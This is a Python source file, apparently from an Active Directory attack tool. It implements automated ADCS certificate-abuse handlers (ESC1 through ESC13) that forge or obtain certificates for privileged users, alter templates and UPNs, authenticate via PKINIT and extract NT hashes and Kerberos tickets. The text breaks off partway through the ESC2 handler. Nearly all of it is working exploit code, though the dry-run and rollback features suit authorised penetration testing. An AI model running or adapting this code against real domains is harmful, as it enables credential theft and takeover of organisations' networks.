"""AD Certificate Services (ADCS) ESC exploitation handlers.

Implements handlers for the following BloodHound ADCS edge types:

* **ADCSESC1** -- Misconfigured template allows requestor-specified SAN.
* **ADCSESC3** -- Enrollment agent template + on-behalf-of issuance.
* **ADCSESC4** -- Template write access -> modify -> exploit -> restore.
* **ADCSESC6** -- EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag -> SAN in any template.
* **ADCSESC9** -- No security extension + CT_FLAG_NO_SECURITY_EXTENSION -> UPN mapping abuse.
* **ADCSESC10** -- Weak certificate mapping (CertificateMappingMethods) abuse.
* **ADCSESC13** -- Issuance policy OID linked to group membership.

All handlers use the certipy-ad wrapper for certificate operations and
follow the three-method interface defined by :class:`BaseEdgeHandler`.
"""

from __future__ import annotations

import shutil
from datetime import datetime, timezone

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools.certipy_wrapper import (
    certipy_account,
    certipy_auth,
    certipy_find,
    certipy_request,
    certipy_template,
)


# ---------------------------------------------------------------------------
# Helpers shared by multiple ESC handlers
# ---------------------------------------------------------------------------


def _require_certipy() -> tuple[bool, str] | None:
    """Return an error tuple if certipy is not on PATH, else ``None``."""
    if not shutil.which("certipy"):
        return (
            False,
            "certipy binary not found on PATH. Install via: pip install certipy-ad",
        )
    return None


def _extract_edge_props(edge: EdgeInfo) -> dict:
    """Extract commonly needed properties from the edge / target node.

    BloodHound CE stores ADCS metadata in edge properties:
    * ``ca_name`` -- the Certificate Authority name
    * ``template_name`` -- the certificate template name
    * ``domain`` -- target domain
    """
    props = dict(edge.properties)
    # Merge target node properties for template/CA info
    props.update(edge.target.properties)
    return props


def _make_cert_credential(
    pfx_path: str,
    username: str,
    domain: str,
    source: str,
) -> Credential:
    """Create a certificate :class:`Credential`."""
    return Credential(
        cred_type=CredentialType.certificate,
        value=pfx_path,
        username=username,
        domain=domain,
        obtained_from=source,
        obtained_at=datetime.now(timezone.utc),
    )


def _make_nt_hash_credential(
    nt_hash: str,
    username: str,
    domain: str,
    source: str,
) -> Credential:
    """Create an NT hash :class:`Credential`."""
    return Credential(
        cred_type=CredentialType.nt_hash,
        value=nt_hash,
        username=username,
        domain=domain,
        obtained_from=source,
        obtained_at=datetime.now(timezone.utc),
    )


def _make_ccache_credential(
    ccache_path: str,
    username: str,
    domain: str,
    source: str,
) -> Credential:
    """Create a ccache :class:`Credential`."""
    return Credential(
        cred_type=CredentialType.ccache,
        value=ccache_path,
        username=username,
        domain=domain,
        obtained_from=source,
        obtained_at=datetime.now(timezone.utc),
    )


async def _authenticate_with_pfx(
    pfx_path: str,
    dc_ip: str,
    domain: str,
    target_user: str,
    source_label: str,
    cred_store,
    logger,
) -> tuple[bool, str, list[Credential]]:
    """Shared PKINIT authentication + UnPAC-the-hash flow.

    Used by ESC1, ESC3, ESC4, ESC6, ESC9, ESC10, and ESC13 after a
    certificate has been obtained.

    Returns:
        ``(success, message, new_credentials)`` tuple.
    """
    new_creds: list[Credential] = []

    # Store the certificate credential
    cert_cred = _make_cert_credential(pfx_path, target_user, domain, source_label)
    new_creds.append(cert_cred)
    cred_store.add_credential(cert_cred)

    # Authenticate
    logger.info("Authenticating as '%s' via PKINIT with %s", target_user, pfx_path)
    auth_result = await certipy_auth(
        pfx_path=pfx_path,
        dc_ip=dc_ip,
        domain=domain,
    )

    if not auth_result["success"]:
        return (
            False,
            f"PKINIT auth failed for '{target_user}': {auth_result.get('error', 'unknown')}",
            new_creds,
        )

    parsed = auth_result.get("parsed") or {}

    if parsed.get("ccache_path"):
        ccache_cred = _make_ccache_credential(
            parsed["ccache_path"], target_user, domain, f"{source_label}:pkinit"
        )
        new_creds.append(ccache_cred)
        cred_store.add_credential(ccache_cred)
        logger.info("Stored TGT ccache: %s", parsed["ccache_path"])

    if parsed.get("nt_hash"):
        hash_cred = _make_nt_hash_credential(
            parsed["nt_hash"], target_user, domain, f"{source_label}:unpac"
        )
        new_creds.append(hash_cred)
        cred_store.add_credential(hash_cred)
        nt = parsed["nt_hash"]
        logger.info("Recovered NT hash for '%s': %s...%s", target_user, nt[:4], nt[-4:])

    msg = f"{source_label} succeeded against '{target_user}'."
    if parsed.get("nt_hash"):
        nt = parsed["nt_hash"]
        msg += f" NT hash: {nt[:4]}...{nt[-4:]}"
    return (True, msg, new_creds)


# ===================================================================
# ESC1: Misconfigured template allows requestor-specified SAN
# ===================================================================


@register_handler("ADCSESC1")
class ADCSESC1Handler(BaseEdgeHandler):
    """ESC1: Misconfigured certificate template allows the requestor to
    specify a Subject Alternative Name (SAN).

    Attack flow:
        1. Use certipy to find the vulnerable template on the CA.
        2. Request a certificate specifying the target DA user's UPN as the SAN.
        3. Authenticate with the certificate via PKINIT.
        4. Recover NT hash via UnPAC-the-hash.

    Rollback:
        This attack is non-destructive (no AD objects are modified).
        The issued certificate will expire naturally. No rollback required.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")
        template_name = props.get("template_name") or props.get("CertTemplate")

        if not ca_name:
            return (False, "CA name not found in edge properties. Cannot proceed.")
        if not template_name:
            return (False, "Template name not found in edge properties. Cannot proceed.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready for ESC1: template='{template_name}', CA='{ca_name}'")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        template_name = props.get("template_name") or props.get("CertTemplate", "UNKNOWN-TEMPLATE")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would request cert from CA='{ca_name}', "
                f"template='{template_name}' with UPN='{target_upn}'.",
                [],
            )

        # Step 1: Request certificate with alternate SAN
        self.logger.info(
            "ESC1: Requesting certificate from CA='%s', template='%s', UPN='%s'",
            ca_name, template_name, target_upn,
        )
        req_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
            upn=target_upn,
        )

        if not req_result["success"]:
            return (
                False,
                f"ESC1 cert request failed: {req_result.get('error', 'unknown')}",
                [],
            )

        parsed = req_result.get("parsed") or {}
        pfx_path = parsed.get("pfx_path")
        if not pfx_path:
            return (False, "Certificate request succeeded but no PFX path in output.", [])

        # Step 2: Authenticate with the certificate
        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC1", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC1 is non-destructive; no AD modifications to undo
        return None


# ===================================================================
# ESC3: Enrollment agent template + on-behalf-of issuance
# ===================================================================


@register_handler("ADCSESC3")
class ADCSESC3Handler(BaseEdgeHandler):
    """ESC3: Enrollment agent template combined with a second template that
    allows enrollment on behalf of another user.

    Attack flow:
        1. Request an enrollment agent certificate using the first template.
        2. Use the enrollment agent cert to request a certificate on behalf
           of the target (e.g., Domain Admin) using the second template.
        3. Authenticate with the second certificate via PKINIT.

    Rollback:
        Non-destructive -- no AD objects modified.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")
        agent_template = props.get("agent_template") or props.get("CertTemplate")
        target_template = props.get("target_template") or props.get("CertTemplate2")

        if not ca_name:
            return (False, "CA name not found in edge properties.")
        if not agent_template:
            return (False, "Enrollment agent template not found in edge properties.")

        return (
            True,
            f"Ready for ESC3: agent_template='{agent_template}', CA='{ca_name}'",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        agent_template = props.get("agent_template") or props.get("CertTemplate", "UNKNOWN-AGENT")
        target_template = props.get("target_template") or props.get("CertTemplate2", "User")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would request enrollment agent cert (template='{agent_template}'), "
                f"then cert on behalf of '{target_user}' (template='{target_template}').",
                [],
            )

        # Step 1: Request enrollment agent certificate
        self.logger.info(
            "ESC3 Step 1: Requesting enrollment agent cert, template='%s'",
            agent_template,
        )
        agent_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=agent_template,
            auth_args=auth_args,
        )

        if not agent_result["success"]:
            return (
                False,
                f"ESC3 enrollment agent request failed: {agent_result.get('error', 'unknown')}",
                [],
            )

        agent_parsed = agent_result.get("parsed") or {}
        agent_pfx = agent_parsed.get("pfx_path")
        if not agent_pfx:
            return (False, "Agent cert request succeeded but no PFX path in output.", [])

        # Step 2: Request certificate on behalf of target using the agent cert
        self.logger.info(
            "ESC3 Step 2: Requesting cert on behalf of '%s', template='%s'",
            target_user, target_template,
        )
        # Build auth args using the agent certificate
        agent_auth = ["-pfx", agent_pfx]
        obo_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=target_template,
            auth_args=agent_auth,
            on_behalf_of=f"{domain}\\{target_user}",
        )

        if not obo_result["success"]:
            return (
                False,
                f"ESC3 on-behalf-of request failed: {obo_result.get('error', 'unknown')}",
                [],
            )

        obo_parsed = obo_result.get("parsed") or {}
        target_pfx = obo_parsed.get("pfx_path")
        if not target_pfx:
            return (False, "On-behalf-of request succeeded but no PFX path in output.", [])

        # Step 3: Authenticate with the target certificate
        return await _authenticate_with_pfx(
            target_pfx, dc_host, domain, target_user, "ADCSESC3", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC3 is non-destructive
        return None


# ===================================================================
# ESC4: Template write access -> modify -> exploit -> restore
# ===================================================================


@register_handler("ADCSESC4")
class ADCSESC4Handler(BaseEdgeHandler):
    """ESC4: Write access to a certificate template allows modification
    to make it ESC1-vulnerable, then exploit and restore.

    Attack flow:
        1. Save the original template configuration via ``certipy template``.
        2. Modify the template to allow requestor-specified SAN (ESC1 condition).
        3. Request a certificate with the target's UPN as SAN.
        4. Authenticate via PKINIT.
        5. Rollback restores the original template configuration.

    Rollback:
        Restore the certificate template to its original configuration
        using the saved backup JSON.
    """

    _old_config_path: str | None = None

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")
        template_name = props.get("template_name") or props.get("CertTemplate")

        if not template_name:
            return (False, "Template name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (
            True,
            f"Ready for ESC4: template='{template_name}' (will modify and restore).",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        template_name = props.get("template_name") or props.get("CertTemplate", "UNKNOWN-TEMPLATE")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would modify template '{template_name}' to ESC1, "
                f"request cert as '{target_upn}', then restore template.",
                [],
            )

        # Step 1: Modify template (save old config)
        self.logger.info(
            "ESC4 Step 1: Modifying template '%s' to enable ESC1 condition",
            template_name,
        )
        mod_result = await certipy_template(
            target=dc_host,
            template=template_name,
            auth_args=auth_args,
            save_old=True,
        )

        if not mod_result["success"]:
            return (
                False,
                f"ESC4 template modification failed: {mod_result.get('error', 'unknown')}",
                [],
            )

        mod_parsed = mod_result.get("parsed") or {}
        self._old_config_path = mod_parsed.get("old_config_path")
        if self._old_config_path:
            self.logger.info("Saved original template config to: %s", self._old_config_path)

        # Step 2: Request certificate with SAN (now ESC1-vulnerable)
        self.logger.info(
            "ESC4 Step 2: Requesting certificate with UPN='%s'", target_upn,
        )
        req_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
            upn=target_upn,
        )

        if not req_result["success"]:
            # Template was modified but request failed; rollback needed
            self.logger.error(
                "ESC4 cert request failed after template modification. "
                "The template should be restored via rollback."
            )
            return (
                False,
                f"ESC4 cert request failed: {req_result.get('error', 'unknown')}. "
                "Template has been modified and needs rollback!",
                [],
            )

        req_parsed = req_result.get("parsed") or {}
        pfx_path = req_parsed.get("pfx_path")
        if not pfx_path:
            return (
                False,
                "ESC4 cert request succeeded but no PFX path in output.",
                [],
            )

        # Step 3: Restore template immediately (don't wait for rollback)
        self.logger.info(
            "ESC4 Step 3: Restoring template '%s' to original configuration",
            template_name,
        )
        if self._old_config_path:
            restore_result = await certipy_template(
                target=dc_host,
                template=template_name,
                auth_args=auth_args,
                save_old=False,
                configuration={"config_path": self._old_config_path},
            )
            if restore_result["success"]:
                self.logger.info("Template '%s' restored successfully.", template_name)
            else:
                self.logger.warning(
                    "Template restore failed: %s. Manual rollback may be needed.",
                    restore_result.get("error", "unknown"),
                )

        # Step 4: Authenticate with the obtained certificate
        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC4", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        template_name = _extract_edge_props(edge).get("template_name") or _extract_edge_props(edge).get("CertTemplate", "UNKNOWN")
        dc_host = self._get_dc_host()
        domain = self._get_domain()

        if self._old_config_path:
            command = (
                f"certipy template -target {dc_host} "
                f"-template '{template_name}' "
                f"-configuration '{self._old_config_path}' "
                f"-domain {domain}"
            )
        else:
            command = (
                f"certipy template -target {dc_host} "
                f"-template '{template_name}' "
                f"-domain {domain} "
                "# WARNING: No saved config -- manual restore required"
            )

        return RollbackAction(
            step_index=0,
            action_type="restore_certificate_template",
            description=f"Restore template '{template_name}' to original configuration",
            command=command,
            reversible=True,
        )


# ===================================================================
# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
# ===================================================================


@register_handler("ADCSESC6")
class ADCSESC6Handler(BaseEdgeHandler):
    """ESC6: The CA has the ``EDITF_ATTRIBUTESUBJECTALTNAME2`` flag enabled,
    which allows any template to include a requestor-specified SAN.

    Attack flow:
        1. Request a certificate from any enrollable template, specifying
           the target DA user's UPN as the SAN.
        2. Authenticate via PKINIT with the certificate.
        3. Recover NT hash via UnPAC-the-hash.

    Rollback:
        Non-destructive -- exploits a CA-level misconfiguration.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")
        template_name = props.get("template_name") or props.get("CertTemplate")

        if not ca_name:
            return (False, "CA name not found in edge properties.")

        return (
            True,
            f"Ready for ESC6: CA='{ca_name}' has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled.",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        # ESC6 can use any enrollable template; prefer one from edge or fallback to "User"
        template_name = props.get("template_name") or props.get("CertTemplate", "User")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would request cert from CA='{ca_name}' "
                f"(EDITF flag), template='{template_name}', UPN='{target_upn}'.",
                [],
            )

        # Request certificate with SAN (exploiting the CA flag)
        self.logger.info(
            "ESC6: Requesting cert from CA='%s' with UPN='%s' (EDITF flag exploit)",
            ca_name, target_upn,
        )
        req_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
            upn=target_upn,
        )

        if not req_result["success"]:
            return (
                False,
                f"ESC6 cert request failed: {req_result.get('error', 'unknown')}",
                [],
            )

        parsed = req_result.get("parsed") or {}
        pfx_path = parsed.get("pfx_path")
        if not pfx_path:
            return (False, "ESC6 cert request succeeded but no PFX path in output.", [])

        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC6", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC6 is non-destructive
        return None


# ===================================================================
# ESC9: No security extension + CT_FLAG_NO_SECURITY_EXTENSION
# ===================================================================


@register_handler("ADCSESC9")
class ADCSESC9Handler(BaseEdgeHandler):
    """ESC9: Certificate templates with ``CT_FLAG_NO_SECURITY_EXTENSION`` and
    no ``szOID_NTDS_CA_SECURITY_EXT`` extension enable UPN mapping abuse.

    Attack flow:
        1. Modify the controlled account's UPN to the target DA's UPN.
        2. Request a certificate (the cert maps to the DA via UPN).
        3. Restore the original UPN on the controlled account.
        4. Authenticate with the certificate as the DA.

    Rollback:
        Restore the controlled account's UPN to its original value.
    """

    _original_upn: str | None = None

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")
        template_name = props.get("template_name") or props.get("CertTemplate")

        if not template_name:
            return (False, "Template name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready for ESC9: template='{template_name}'")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        source_user = self._resolve_principal(edge)
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        template_name = props.get("template_name") or props.get("CertTemplate", "UNKNOWN-TEMPLATE")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would change UPN of '{source_user}' to '{target_upn}', "
                f"request cert, restore UPN, then authenticate.",
                [],
            )

        # Step 1: Change the source account's UPN to the target's UPN
        self.logger.info(
            "ESC9 Step 1: Changing UPN of '%s' to '%s'",
            source_user, target_upn,
        )
        upn_result = await certipy_account(
            target=dc_host,
            user=source_user,
            auth_args=auth_args,
            upn=target_upn,
        )

        if not upn_result["success"]:
            return (
                False,
                f"ESC9 UPN change failed: {upn_result.get('error', 'unknown')}",
                [],
            )

        upn_parsed = upn_result.get("parsed") or {}
        self._original_upn = upn_parsed.get("old_upn", f"{source_user}@{domain}")
        self.logger.info(
            "Original UPN saved for rollback: %s", self._original_upn,
        )

        # Step 2: Request certificate (cert will map to target via UPN)
        self.logger.info(
            "ESC9 Step 2: Requesting cert as '%s' (UPN now='%s')",
            source_user, target_upn,
        )
        req_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
        )

        if not req_result["success"]:
            self.logger.error(
                "ESC9 cert request failed. UPN has been modified and needs rollback!"
            )
            return (
                False,
                f"ESC9 cert request failed: {req_result.get('error', 'unknown')}. "
                "UPN was modified and needs rollback!",
                [],
            )

        req_parsed = req_result.get("parsed") or {}
        pfx_path = req_parsed.get("pfx_path")

        # Step 3: Restore UPN immediately
        self.logger.info(
            "ESC9 Step 3: Restoring UPN of '%s' to '%s'",
            source_user, self._original_upn,
        )
        restore_result = await certipy_account(
            target=dc_host,
            user=source_user,
            auth_args=auth_args,
            upn=self._original_upn,
        )

        if restore_result["success"]:
            self.logger.info("UPN restored successfully.")
        else:
            self.logger.warning(
                "UPN restore failed: %s. Manual rollback required.",
                restore_result.get("error", "unknown"),
            )

        if not pfx_path:
            return (False, "ESC9 cert request succeeded but no PFX path in output.", [])

        # Step 4: Authenticate with the certificate as the target
        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC9", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        source_user = self._resolve_principal(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        original_upn = self._original_upn or f"{source_user}@{domain}"

        return RollbackAction(
            step_index=0,
            action_type="restore_upn",
            description=f"Restore UPN of '{source_user}' to '{original_upn}'",
            command=(
                f"certipy account update -target {dc_host} "
                f"-user {source_user} -domain {domain} "
                f"-upn '{original_upn}'"
            ),
            reversible=True,
        )


# ===================================================================
# ESC10: Weak certificate mapping (CertificateMappingMethods)
# ===================================================================


@register_handler("ADCSESC10")
class ADCSESC10Handler(BaseEdgeHandler):
    """ESC10: Weak certificate mapping configuration
    (``CertificateMappingMethods`` includes UPN mapping) enables the
    same UPN-change-based attack as ESC9.

    Attack flow:
        Identical to ESC9:
        1. Change controlled account's UPN to target's UPN.
        2. Request a certificate.
        3. Restore UPN.
        4. Authenticate with the certificate.

    The difference from ESC9 is the root cause: ESC10 exploits weak
    ``CertificateMappingMethods`` registry settings on the DC, while
    ESC9 exploits the ``CT_FLAG_NO_SECURITY_EXTENSION`` template flag.

    Rollback:
        Restore the controlled account's UPN.
    """

    _original_upn: str | None = None

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")
        template_name = props.get("template_name") or props.get("CertTemplate")

        if not template_name:
            return (False, "Template name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (True, f"Ready for ESC10: template='{template_name}' (weak cert mapping)")

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        source_user = self._resolve_principal(edge)
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        template_name = props.get("template_name") or props.get("CertTemplate", "UNKNOWN-TEMPLATE")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] ESC10: Would change UPN of '{source_user}' to '{target_upn}', "
                f"request cert from template='{template_name}', restore UPN, authenticate.",
                [],
            )

        # Step 1: Change UPN
        self.logger.info(
            "ESC10 Step 1: Changing UPN of '%s' to '%s'",
            source_user, target_upn,
        )
        upn_result = await certipy_account(
            target=dc_host,
            user=source_user,
            auth_args=auth_args,
            upn=target_upn,
        )

        if not upn_result["success"]:
            return (
                False,
                f"ESC10 UPN change failed: {upn_result.get('error', 'unknown')}",
                [],
            )

        upn_parsed = upn_result.get("parsed") or {}
        self._original_upn = upn_parsed.get("old_upn", f"{source_user}@{domain}")

        # Step 2: Request certificate
        self.logger.info(
            "ESC10 Step 2: Requesting cert as '%s' (UPN='%s')",
            source_user, target_upn,
        )
        req_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
        )

        if not req_result["success"]:
            self.logger.error("ESC10 cert request failed. UPN needs rollback!")
            return (
                False,
                f"ESC10 cert request failed: {req_result.get('error', 'unknown')}. "
                "UPN was modified and needs rollback!",
                [],
            )

        req_parsed = req_result.get("parsed") or {}
        pfx_path = req_parsed.get("pfx_path")

        # Step 3: Restore UPN
        self.logger.info(
            "ESC10 Step 3: Restoring UPN of '%s' to '%s'",
            source_user, self._original_upn,
        )
        restore_result = await certipy_account(
            target=dc_host,
            user=source_user,
            auth_args=auth_args,
            upn=self._original_upn,
        )

        if restore_result["success"]:
            self.logger.info("UPN restored successfully.")
        else:
            self.logger.warning(
                "UPN restore failed: %s. Manual rollback needed.",
                restore_result.get("error", "unknown"),
            )

        if not pfx_path:
            return (False, "ESC10 cert request succeeded but no PFX path in output.", [])

        # Step 4: Authenticate
        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC10", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        source_user = self._resolve_principal(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        original_upn = self._original_upn or f"{source_user}@{domain}"

        return RollbackAction(
            step_index=0,
            action_type="restore_upn",
            description=f"Restore UPN of '{source_user}' to '{original_upn}'",
            command=(
                f"certipy account update -target {dc_host} "
                f"-user {source_user} -domain {domain} "
                f"-upn '{original_upn}'"
            ),
            reversible=True,
        )


# ===================================================================
# ESC13: Issuance policy OID linked to group membership
# ===================================================================


@register_handler("ADCSESC13")
class ADCSESC13Handler(BaseEdgeHandler):
    """ESC13: An issuance policy on a certificate template is linked to an
    AD group via the OID's ``msDS-OIDToGroupLink`` attribute.

    When a certificate is issued with this policy OID, the holder
    effectively gains membership in the linked group.

    Attack flow:
        1. Request a certificate from the template that includes the
           issuance policy OID linked to the privileged group.
        2. Authenticate with the certificate via PKINIT -- the KDC
           includes the group SID in the PAC, granting access.

    Rollback:
        Non-destructive -- exploits existing OID-to-group linkage.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")
        template_name = props.get("template_name") or props.get("CertTemplate")

        if not ca_name:
            return (False, "CA name not found in edge properties.")
        if not template_name:
            return (False, "Template name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (
            True,
            f"Ready for ESC13: template='{template_name}' with OID group link.",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        source_user = self._resolve_principal(edge)
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        template_name = props.get("template_name") or props.get("CertTemplate", "UNKNOWN-TEMPLATE")

        if dry_run:
            return (
                True,
                f"[DRY RUN] ESC13: Would request cert from template='{template_name}' "
                f"(OID group link) on CA='{ca_name}', then authenticate.",
                [],
            )

        # Step 1: Request certificate with the OID-linked template
        self.logger.info(
            "ESC13: Requesting cert from CA='%s', template='%s' (OID group link)",
            ca_name, template_name,
        )
        req_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
        )

        if not req_result["success"]:
            return (
                False,
                f"ESC13 cert request failed: {req_result.get('error', 'unknown')}",
                [],
            )

        parsed = req_result.get("parsed") or {}
        pfx_path = parsed.get("pfx_path")
        if not pfx_path:
            return (False, "ESC13 cert request succeeded but no PFX path in output.", [])

        # Step 2: Authenticate -- the KDC will include the group SID in the PAC
        # The "target_user" here is the source_user (we're authenticating as ourselves,
        # but gaining group membership via the OID link).
        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, source_user, "ADCSESC13", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC13 is non-destructive
        return None


# ===================================================================
# ESC2: Subordinate CA abuse (Any Purpose / SubCA EKU)
# ===================================================================


@register_handler("ADCSESC2")
class ADCSESC2Handler(BaseEdgeHandler):
    """ESC2: Certificate template allows ``Any Purpose`` or ``SubCA`` EKU.

    A template configured with the ``Any Purpose`` EKU or the SubCA
    (Subordinate Certification Authority) EKU can be abused to issue
    certificates for any user, effectively acting as a subordinate CA.

    Attack flow:
        1. Request a certificate from the vulnerable template.
        2. The resulting certificate can be used for any purpose including
           client authentication as any user.
        3. Authenticate via PKINIT with the certificate.

    Rollback:
        Non-destructive -- exploits an existing template misconfiguration.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")
        template_name = props.get("template_name") or props.get("CertTemplate")

        if not ca_name:
            return (False, "CA name not found in edge properties.")
        if not template_name:
            return (False, "Template name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (
            True,
